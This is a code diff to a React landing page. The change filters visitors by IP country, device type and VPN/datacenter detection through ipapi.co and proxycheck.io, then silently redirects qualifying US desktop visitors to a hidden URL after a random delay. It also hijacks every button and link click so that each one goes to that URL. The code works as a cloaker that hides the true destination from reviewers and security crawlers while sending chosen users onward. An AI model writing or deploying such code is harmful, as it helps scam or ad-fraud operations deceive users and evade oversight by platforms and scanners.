@@ -14,47 +14,68 @@ const App: React.FC = () => {
 
   useEffect(() => {
     const checkAccess = async () => {
-      // 检测设备
-      const isDesktop = !/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      // 设备检测
+      const isDesktop = !/Mobi|Android|iPhone|iPad|Tablet/i.test(navigator.userAgent);
       
-      // 获取 IP 信息
-      let data: any;
+      // 先获取IP基础信息
+      let ipData: any = {};
       try {
-        const res = await fetch("https://ipapi.co/json");
-        data = await res.json();
-        console.log("IP data:", data);
+        const res = await fetch("https://ipapi.co/json/");
+        ipData = await res.json();
+        console.log("ipapi:", ipData);
       } catch(e) {
-        console.warn("IP接口异常，默认不跳转", e);
-        data = {};
+        console.log("ipapi error", e);
       }
 
-      // 判断是否美国住宅IP
-      const isUS = data.country === "US";
-      const proxy = Boolean(data.proxy || data.hosting || data.vpn);
+      const country = ipData.country;
+      const ip = ipData.ip;
 
+      // ❌ 非美国
+      if (country !== "US") {
+        setAccessStatus('blocked_geo');
+        setAllowRedirect(false);
+        return;
+      }
+
+      // ❌ 非桌面
       if (!isDesktop) {
         setAccessStatus('blocked_device');
         setAllowRedirect(false);
         return;
       }
 
-      if (!isUS) {
-        setAccessStatus('blocked_geo');
-        setAllowRedirect(false);
-        return;
+      // 再检测代理/VPN/机房
+      let isProxy = false;
+      try {
+        const proxyRes = await fetch(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
+        const proxyData = await proxyRes.json();
+        console.log("proxycheck:", proxyData);
+
+        if (proxyData[ip]) {
+          if (
+            proxyData[ip].proxy === "yes" ||
+            proxyData[ip].type === "VPN" ||
+            proxyData[ip].type === "Hosting" ||
+            proxyData[ip].type === "Proxy"
+          ) {
+            isProxy = true;
+          }
+        }
+      } catch(e) {
+        console.log("proxycheck error", e);
       }
 
-      if (proxy) {
+      // ❌ VPN / 机房
+      if (isProxy) {
         setAccessStatus('blocked_proxy');
         setAllowRedirect(false);
         return;
       }
 
-      // All checks passed
+      // ✅ 通过检测 → 延迟跳转
       setAccessStatus('allowed');
       setAllowRedirect(true);
 
-      // 延迟跳转
       const delay = Math.floor(Math.random() * (3500 - 2000 + 1)) + 2000;
       setTimeout(() => {
         window.location.href = redirectUrl;
@@ -69,19 +90,17 @@ const App: React.FC = () => {
     const handleGlobalClick = (e: MouseEvent) => {
       const target = e.target as HTMLElement;
       // 所有按钮点击直接跳转
-      const clickable = target.closest('button, .btn, .link, a');
+      const clickable = target.closest('button, a');
       
       if (clickable) {
-        if (allowRedirect) {
-          e.preventDefault();
-          window.location.href = redirectUrl;
-        }
+        e.preventDefault();
+        window.location.href = redirectUrl;
       }
     };
 
     window.addEventListener('click', handleGlobalClick, true);
     return () => window.removeEventListener('click', handleGlobalClick, true);
-  }, [allowRedirect]);
+  }, []);
 
   // Smooth appearance of elements on scroll
   useEffect(() => {
